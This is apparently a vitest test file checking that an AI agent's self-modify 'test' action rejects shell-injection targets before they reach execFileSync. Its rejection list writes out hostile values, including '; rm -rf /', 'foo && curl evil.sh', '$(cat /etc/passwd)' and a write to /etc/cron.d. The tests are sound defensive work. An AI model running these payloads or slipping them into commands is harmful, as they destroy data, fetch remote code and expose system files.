/**
 * Tests for buildTestArgs — the validation/arg-construction behind the new
 * meta.self-modify `test` action. The target is agent-supplied and (via
 * runWithCode) reaches execFileSync; these tests lock in that only safe vitest
 * paths/patterns pass and every shell-metacharacter payload is rejected, so a
 * crafted target can never inject a command.
 */

import { describe, it, expect } from 'vitest';
import { buildTestArgs } from '../../src/core/tools/builtin/meta/self-modify.js';

describe('buildTestArgs — full suite', () => {
  it('returns just ["test"] when no target is given', () => {
    expect(buildTestArgs()).toEqual({ args: ['test'] });
    expect(buildTestArgs(undefined)).toEqual({ args: ['test'] });
  });

  it('treats empty / whitespace as no target', () => {
    expect(buildTestArgs('')).toEqual({ args: ['test'] });
    expect(buildTestArgs('   ')).toEqual({ args: ['test'] });
  });
});

describe('buildTestArgs — valid scoped targets', () => {
  it.each([
    'self-modify',
    'tests/meta',
    'tests/meta/self-modify-test-action.test.ts',
    'tests/*.test.ts',
    'src/core/agent/loop.test.ts',
    'a_b.c-d/e',
  ])('accepts %j and forwards it after "--"', (target) => {
    expect(buildTestArgs(target)).toEqual({ args: ['test', '--', target] });
  });
});

describe('buildTestArgs — rejects shell-injection payloads', () => {
  it.each([
    '; rm -rf /',
    'foo && curl evil.sh',
    'foo || true',
    'foo | cat',
    'foo`whoami`',
    '$(cat /etc/passwd)',
    'foo > /etc/cron.d/x',
    'foo & disown',
    'foo;bar',
    'foo bar',          // space — would split into extra args
    "foo'quote",
    'foo"quote',
    'foo\nbar',
  ])('rejects %j', (target) => {
    const r = buildTestArgs(target);
    expect('error' in r).toBe(true);
  });
});
